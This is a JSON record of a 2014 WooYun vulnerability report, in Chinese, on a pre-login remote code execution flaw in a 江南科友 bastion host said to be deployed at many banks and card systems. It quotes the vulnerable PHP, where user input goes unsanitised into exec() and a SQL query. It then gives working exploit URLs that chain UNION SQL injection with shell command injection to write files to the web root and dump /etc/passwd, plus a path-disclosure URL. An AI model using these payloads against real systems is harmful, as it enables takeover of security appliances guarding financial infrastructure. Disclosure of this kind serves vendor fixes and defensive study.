{"id": 48670, "wybug_id": "wooyun-2014-076864", "wybug_title": "江南科友堡垒机远程代码执行漏洞第二弹（无需登录直接写shell)", "wybug_corp": "江南科友科技股份有限公司", "wybug_author": "路人甲", "wybug_date": "2014-09-21 23:36", "wybug_open_date": "2014-12-20 23:38", "wybug_type": "默认配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-20：\t细节向公众公开  简要描述：  详细说明：  详情见 WooYun: 江南科友堡垒机全版本getshell（无需登录）  漏洞涉及客户如下：国内各大银行：中国银行、民生银行、广东发展银行、平安银行、深圳发展银行、浦发银行、渤海银行总行及各分行、中国工商银行、中国农业银行、中国建设银行、交通银行、招商银行、中信银行、兴业银行、华夏银行、中国邮政储蓄银行总行或部分分行中国银联：总公司及北京、广州、深圳、南京、福州、长沙、武汉、济南、青岛、沈阳、郑州、海口、天津、香港、厦门等分公司银联数据：全国卡系统业务托管商业银行外资银行：渣打银行、东亚银行：全国境内各个分行外资金融机构：韩亚银行、花旗银行、通用电气、星展银行、美国第一资讯（FDC)地方商业银行及农村信用社：40余家商业银行及农村信用社社会保障与公共交通系统：湖北、黑龙江、广东、北京等社保卡安全系统，上海市公交一卡通安全系统，杭州市市民卡系统，长春一汽企业IC卡加密系统，宁波市民卡系统，郑州交通一卡通系统，山东一卡通系统由于某一页面未对用户参数进行充分考虑，导致用户构造好特殊的数据包达到代码执行，直接写shell，控制整个堡垒机的过程，全程无需登录，一键写shell 。。。一键root ...代码在system/download_cert.php当中上关键代码 \nif(isset($_GET['manager']) && isset($_GET['user_id']) && isset($_GET['cert_psw']))\t{\t\t$db = new SystemDB();\t\t\t$cert_msg = $db->getCertById('',$_GET['user_id'],$_GET['manager']);\t\t\t\tif(!empty($cert_msg))\t\t{\t\t\t$cmd = \"openssl pkcs12 -export\";\t\t\tif(!empty($_GET['cert_psw']))\t\t\t{\t\t\t\t$cmd .= \" -password pass:\".$_GET['cert_psw'];\t\t\t}\t\t\telse\t\t\t{\t\t\t\t$cmd .= \" -password pass:\";\t\t\t}\t\t\t$cmd .= \" -inkey /usr/local/keyou/Config/certs/\".$cert_msg[0]['serial_no'].\".key -in /usr/local/keyou/Config/certs/\".$cert_msg[0]['serial_no'].\".pem  -out  /usr/local/apache2/htdocs/project/www/download/\".$cert_msg[0]['serial_no'].\".pfx\";\t\t\t//echo $cmd;\t\t\texec($cmd);\n一条条分析，当存在manager user_id cert_psw 这3个变量执行下面的语句关键变量如下$cert_msg  如果它存在则可以执行下面的语句了。因为下面有个exec($cmd);如果能控制$cmd ，那就是直接命令执行了，导致可以任意写文件，写shell 控制服务器了。。。我们怎么控制$cmd? $cmd .= \" -password pass:\".$_GET['cert_psw']; 这里的$_GET['cert_psw']是可控的，但是有条件。。要$cert_msg 不为空才能执行如何确保$cert_msg不为空？  这里就需要$cert_msg = $db->getCertById('',$_GET['user_id'],$_GET['manager']); 这句执行的内容返回值不为空了。我们看看getCerById方法吧\npublic function getCertById($id=null,$user_id=null,$userflag=null)     {    \ttry     \t{    \t\tif(!empty($id) && empty($user_id))    \t\t\t$sql = \"select * from cert where id = \".$id;    \t\telse if(empty($id) && !empty($user_id))    \t\t{    \t\t\t$sql = \"select * from cert where user_id=\".$user_id.\" and userflag=\".$userflag;\t    \t\t}    \t\t//echo $sql;    \t\t$stmt = $this->dbh->prepare($sql);    \t\t$stmt->execute();    \t\t$set = $stmt->fetchAll();\t\t\t\treturn $set;  \t\t\t                               \t}\n 所以我们控制其中user_id的值就行，我们采用一个union查询保证他返回的内容为真，然后后面的语句注释掉。。通过一步步测试cert的字段为13个。。。所以就好办了。。所以我们GET获取userid 设置为：-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13-- a 即可。。就能确保上面返回为真了。然后我们控制cert_psw变量即可。。。然后任意写shell。。。直接控制服务器了exp如下： (无需登录）https://1.1.1.1/system/download_cert.php?cert_psw=3| echo 3333 > /usr/local/apache2/htdocs/project/www/upload/fuck.txt&user_id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13-- a&manager=1直接写shell的话，爆路径方法如下：https://1.1.1.1/system/download_cert.php?down_cret=1\n\n\n\n所以直接执行系统命令，直接了当的就控制了堡垒机。。。https://1.1.1.1/system/download_cert.php?cert_psw=3| cat /etc/passwd >> /usr/local/apache2/htdocs/project/www/upload/fuck.txt |&user_id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13-- a&manager=1\n\n   漏洞证明：  https://1.1.1.1/system/download_cert.php?down_cret=1\n\n\n\n所以直接执行系统命令，直接了当的就控制了堡垒机。。。https://1.1.1.1/system/download_cert.php?cert_psw=3| cat /etc/passwd >> /usr/local/apache2/htdocs/project/www/upload/fuck.txt |&user_id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13-- a&manager=1\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-09-26 10:15 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-22 09:26 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  默默关注    \n     2014-09-26 11:03 |    \t\t10457793 \t\t\t( 普通白帽子  |\t\t\t        Rank:867 漏洞数:128        | 说好的借，为什么从来不还？O(∩_∩)O)\t\t \n  默默关注    \n     2014-12-21 10:12 |    \t\t影刺 \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:25        | 关注web安全)\t\t \n  卧槽，通杀银行。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}